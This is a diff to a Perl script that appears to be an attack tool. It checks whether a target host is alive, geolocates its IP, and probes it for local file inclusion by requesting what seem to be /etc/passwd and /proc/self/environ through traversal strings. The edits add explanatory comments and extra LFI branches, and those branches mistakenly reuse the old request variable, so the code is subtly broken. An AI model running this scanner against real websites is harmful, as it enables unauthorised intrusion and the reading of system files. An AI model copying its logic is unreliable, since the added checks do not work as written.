@@ -4,6 +4,8 @@ use LWP::UserAgent;
 use HTTP::Request;
 use IO::Socket;
 
+
+#this section checks the platform of OS you are running and clears your terminal for fresh use.
 my $os= "$^O";
 if ($os eq 'MSWin32'){
 system("cls");
@@ -54,7 +56,8 @@ $socket->new(
              PeerPort => "80",
              Proto => "tcp"
             ) or die "Cannot Connect To $host on Port 80\n";
-			if ($socket) {
+			if ($socket) { #Here, we check to see if your host is alive before proceeding.
+	#After confirming your host is alive, we gather a few information from the headers.
 	my @resp;
 	my $linkip;
 	my $link = "http://".$_[0];
@@ -83,7 +86,7 @@ $socket->new(
 	print "Ip Address: $linkip\n";
 	push(@resp, $linkip);
 	}
-	foreach my $ip(@resp){
+	foreach my $ip(@resp){ #Here, we check for the location of HOST.
 	my $ua = LWP::UserAgent->new;
 	my $contents = $ua->get('http://www.melissadata.com/lookups/iplocation.asp?ipaddress='.$ip);
 	my $found = $contents->content;
@@ -96,6 +99,7 @@ $socket->new(
   }
 }
 
+#This section attempts to exploit LFI
 sub injectlfi
 {
 my $llink = $_[0];
@@ -104,13 +108,27 @@ my $plink2 = $llink.$lfi.$vulns[1];
 	print "[*] Checking LFI: $llink$vulns[0]\n\n";
 	my $re = &query($plink);
 	if($re =~ /nobody:x/){
-	print "[!]$host is Vulnerable to LFI\n\n";
+	print "[!] $host is Vulnerable to LFI\n\n";
 	}else{
 	my $plink = $llink.$lfi.$vulns[0].$sub;
 	print "[*] Checking LFI: $llink$vulns[0]$sub\n\n";
 	my $re = &query($plink);
 	if($re =~ /nobody:x/){
 	print "[!] $host is Vulnerable to LFI\n\n";
+	}else{
+	my $plink2 = $llink.$lfi.$vulns[1];
+	print "[*] Checking LFI: $llink$vulns[1]\n\n";
+	my $re = &query($plink);
+	if($re =~ /HTTP_USER_AGENT/){
+	print "[!] $host is Vulnerable to LFI\n\n";
+	}else{
+	my $plink2 = $llink.$lfi.$vulns[1].$sub;
+	print "[*] Checking LFI: $llink$vulns[1]$sub\n\n";
+	my $re = &query($plink);
+	if($re =~ /HTTP_USER_AGENT/){
+	print "[!] $host is Vulnerable to LFI\n\n";
+	}
+	}
 	}
 	}
 	sleep(1);
